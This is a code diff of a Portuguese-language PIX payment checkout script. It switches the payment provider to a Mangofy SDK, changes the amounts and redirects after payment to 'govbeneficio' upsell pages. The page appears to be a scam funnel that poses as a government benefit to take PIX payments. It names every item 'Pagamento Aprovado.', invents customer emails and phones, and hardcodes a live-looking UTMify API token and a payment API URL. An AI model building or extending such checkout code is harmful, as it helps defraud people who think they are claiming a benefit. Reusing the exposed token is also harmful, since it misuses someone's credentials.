@@ -163,36 +163,41 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
         </div>
     </div>
 </div>
+
 <script src="js/url-params.js"></script>
 <script src="js/main.js"></script>
+
+<script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
+
 <script>
 // =====================================================
-// CONFIGURAÇÃO — DUTTYFY PIX
+// CONFIGURAÇÃO
 // =====================================================
-var DUTTYFY_PIX_URL   = 'https://www.pagamentos-seguros.app/api-pix/zqaSpcAug94Zdb8cr3WnAmHjnIwYcheVmU-Cd5kvpKXbQLm0xVtsztoGScRruPtE6EdIOhgH8KaRETL6KtECrQ';
 var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325'; /* mantido para UTMify */
-/* ── CREDENCIAL DA API UTMIFY ── */
 var UTMIFY_API_TOKEN  = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
+
 var redirectUrls = {
-    6187: 'https://govbeneficio.vercel.app/up5.html',
-    3582: 'https://govbeneficio.vercel.app/up5.html',
-    2790: 'https://govbeneficio.vercel.app/up5.html',
-    1320: 'https://govbeneficio.vercel.app/up5.html',
-    8500: 'https://govbeneficio.vercel.app/up5.html',
-    4560: 'https://govbeneficio.vercel.app/up5.html',
-    1825: 'https://govbeneficio.vercel.app/up5.html',
-    100:  'https://govbeneficio.vercel.app/up5.html'
+    6187: 'https://govbeneficio.vercel.app/up4.html',
+    3582: 'https://govbeneficio.vercel.app/up4.html',
+    2790: 'https://govbeneficio.vercel.app/up4.html',
+    1320: 'https://govbeneficio.vercel.app/up4.html',
+    8500: 'https://govbeneficio.vercel.app/up4.html',
+    4560: 'https://govbeneficio.vercel.app/up4.html',
+    1825: 'https://govbeneficio.vercel.app/up4.html',
+    100:  'https://govbeneficio.vercel.app/up4.html'
 };
-var DEFAULT_REDIRECT = 'https://govbeneficio.vercel.app/up5.html';
+var DEFAULT_REDIRECT = 'https://govbeneficio.vercel.app/up4.html';
+
 // =====================================================
 var _txid          = null;
 var _pixCode       = '';
-var _pollingTimer  = null;
+var _qrImage       = '';
 var _expiryTimer   = null;
-var _paymentAmount = 8500;
+var _paymentAmount = 1320;
 var _customerData  = {};
 var _pixCreatedAt  = '';
-var STORAGE_KEY    = 'duttyfy_pix_tx4';
+var STORAGE_KEY    = 'mangofy_pix_tx4'; // Atualizei a key
+
 /* ── CAPTURA DE PARÂMETROS UTM ── */
 var _p            = new URLSearchParams(window.location.search);
 var _utm_source   = _p.get('utm_source')   || '';
@@ -250,15 +255,18 @@ function setStatus(type, html) {
     el.style.display = 'block';
     el.innerHTML = html;
 }
-function displayQRCode(pixCodeStr) {
-    /* Duttyfy não retorna base64 — gera o QR a partir da string EMV */
+function displayQRCode(pixCodeStr, qrImageStr) {
     var el = document.getElementById('qrcode');
     el.innerHTML = '';
-    if (!pixCodeStr) return;
+    if (!pixCodeStr && !qrImageStr) return;
     var img = document.createElement('img');
-    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCodeStr);
+    if(qrImageStr) {
+        img.src = qrImageStr;
+    } else {
+        img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCodeStr);
+    }
     img.alt = 'QR Code PIX';
-    img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto;';
+    img.style.cssText = 'max-width:100%;height:auto;display:block;margin:0 auto; border-radius: 8px;';
     el.appendChild(img);
 }
 function startExpiryTimer(expiry) {
@@ -310,8 +318,8 @@ async function copyPixCode() {
 function updateDiscountBadge() {
     var badge = document.getElementById('discountBadge');
     if (!badge) return;
-    if (_paymentAmount < 8500) {
-        badge.textContent = 'Você ganhou ' + Math.round((8500-_paymentAmount)/8500*100) + '% de desconto!';
+    if (_paymentAmount < 1320) {
+        badge.textContent = 'Você ganhou ' + Math.round((1320-_paymentAmount)/1320*100) + '% de desconto!';
         badge.classList.add('show');
     } else { badge.classList.remove('show'); }
 }
@@ -324,7 +332,7 @@ function renderPix() {
         document.getElementById('payerInfo').style.display = 'block';
     }
     document.getElementById('pixCode').textContent = _pixCode;
-    displayQRCode(_pixCode);
+    displayQRCode(_pixCode, _qrImage);
     togglePaymentMethod('copy');
     showPix();
 }
@@ -341,8 +349,6 @@ function utmifyFmtDate(d) {
 }
 // =====================================================
 // NOTIFICA A UTMIFY VIA API
-//   status = 'waiting_payment' → venda PENDENTE
-//   status = 'paid'            → venda APROVADA
 // =====================================================
 async function utmifyNotificar(status) {
     try {
@@ -402,47 +408,28 @@ async function utmifyNotificar(status) {
     } catch(e) {}
 }
 // =====================================================
-// REDIRECIONA APÓS APROVAÇÃO — REPASSA TODOS OS PARAMS
+// REDIRECIONA APÓS APROVAÇÃO — INSTANTÂNEO
 // =====================================================
 function redirectAfterPayment() {
     var base = redirectUrls[_paymentAmount] || DEFAULT_REDIRECT;
     var url  = new URL(base);
     var cur  = new URLSearchParams(window.location.search);
     cur.forEach(function(value, key) { url.searchParams.set(key, value); });
-    console.log('Redirecionando para:', url.toString());
-    setTimeout(function(){ window.location.href = url.toString(); }, 2000);
+    
+    // Redirecionamento instantâneo
+    window.location.href = url.toString();
 }
 // =====================================================
-// POLLING — DUTTYFY
-// GET {DUTTYFY_PIX_URL}?transactionId={id}
-// Status aprovado: "COMPLETED"
+// CALLBACK AUTOMÁTICO DA MANGOFY (Substitui o Polling)
 // =====================================================
-function startPolling() {
-    if (!_txid) return;
-    console.log('Polling Duttyfy para transactionId:', _txid);
-    var attempts = 0;
-    _pollingTimer = setInterval(async function() {
-        attempts++;
-        if (attempts > 180) { clearInterval(_pollingTimer); return; }
-        try {
-            var r = await fetch(
-                DUTTYFY_PIX_URL + '?transactionId=' + encodeURIComponent(_txid)
-            );
-            var s = await r.json();
-            console.log('Polling tentativa ' + attempts + ':', s.status);
-            if (s.status === 'COMPLETED') {
-                clearInterval(_pollingTimer);
-                clearTx();
-                await utmifyNotificar('paid'); /* ← venda APROVADA na UTMify */
-                setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado!</div>');
-                redirectAfterPayment();
-            }
-        } catch(e) { console.error('Polling erro:', e); }
-    }, 5000);
+async function paymentApproved(){
+    clearTx();
+    await utmifyNotificar('paid');
+    setStatus('paid', '<div class="status-icon">✅</div><div class="status-text">Pagamento confirmado!</div>');
+    redirectAfterPayment();
 }
 // =====================================================
-// CRIA PIX — DUTTYFY
-// POST {DUTTYFY_PIX_URL}  |  Auth: URL criptografada (sem header)
+// CRIA PIX — SDK MANGOFY
 // =====================================================
 async function createPix() {
     var nome     = getP('nome') || getP('name') || '';
@@ -450,59 +437,44 @@ async function createPix() {
     var email    = getP('email') || randomEmail(cpf);
     var telefone = (getP('telefone') || getP('phone') || randomPhone()).replace(/\D/g,'');
     var valorRaw = getP('valor');
-    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 8500;
-    if (isNaN(valor) || valor <= 0) valor = 8500;
+    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 1320;
+    if (isNaN(valor) || valor <= 0) valor = 1320;
+    
     var nomeEnvio = nome.trim();
     if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
+    
     _paymentAmount = valor;
     _customerData  = { nome: nome, documento: cpf, email: email, telefone: telefone };
     _pixCreatedAt  = utmifyFmtDate(new Date());
 
-    /* Captura todos os parâmetros de rastreamento da URL atual */
-    var utmStr = window.location.search.replace(/^\?/, '');
-
-    var payload = {
-        amount: valor,
+    var config = {
+        total_price: valor / 100,
         customer: {
-            name:     nomeEnvio,
+            name: nomeEnvio,
             document: cpf,
-            email:    email,
-            phone:    telefone
+            email: email,
+            phone: telefone
         },
-        item: {
-            title:    'Pagamento Aprovado.',
-            price:    valor,
-            quantity: 1
-        },
-        paymentMethod: 'PIX',
-        utm: utmStr
+        items: [
+            { name: 'Pagamento Aprovado.', price: valor / 100, quantity: 1 }
+        ]
     };
 
-    console.log('Duttyfy payload:', JSON.stringify(payload));
+    var response = await generatePix(config);
+    if(!response.success) throw new Error(response.message || 'Erro ao gerar PIX com Mangofy');
 
-    var res = await fetch(DUTTYFY_PIX_URL, {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(payload)
-    });
-    var data = await res.json();
-    console.log('Duttyfy resposta:', JSON.stringify(data));
-
-    if (!res.ok || !data.pixCode || !data.transactionId) {
-        throw new Error('Erro ' + res.status + ': ' + (data.message || JSON.stringify(data)));
-    }
-
-    _txid    = data.transactionId;
-    _pixCode = data.pixCode;
-
-    /* Duttyfy não retorna expires_at — usa 10 min */
+    _txid    = response.paymentCode || '';
+    _pixCode = response.pixCode || '';
+    _qrImage = response.qrCodeImage || '';
+    
     var expiryMs = Date.now() + 600000;
     saveTx({
-        txid: _txid, pixCode: _pixCode,
+        txid: _txid, pixCode: _pixCode, qrImage: _qrImage,
         amount: _paymentAmount, customer: _customerData,
         expiry: expiryMs
     });
-    return data;
+    
+    return response;
 }
 // =====================================================
 // INICIALIZAÇÃO
@@ -515,13 +487,12 @@ async function initCheckout() {
         return;
     }
     var saved = loadTx();
-    if (saved && saved.txid) {
+    if (saved && saved.pixCode) {
         console.log('Transação salva encontrada:', saved.txid);
-        _txid = saved.txid; _pixCode = saved.pixCode;
+        _txid = saved.txid; _pixCode = saved.pixCode; _qrImage = saved.qrImage || '';
         _paymentAmount = saved.amount; _customerData = saved.customer || {};
         renderPix();
         startExpiryTimer(saved.expiry);
-        startPolling();
         return;
     }
     showLoading(true);
@@ -530,7 +501,6 @@ async function initCheckout() {
         renderPix();
         utmifyNotificar('waiting_payment'); /* ← venda PENDENTE na UTMify */
         startExpiryTimer(Date.now() + 600000);
-        startPolling();
     } catch(err) {
         console.error('Erro ao criar PIX:', err);
         showError('Não foi possível gerar o PIX. ' + (err.message || '') + ' Tente novamente.');
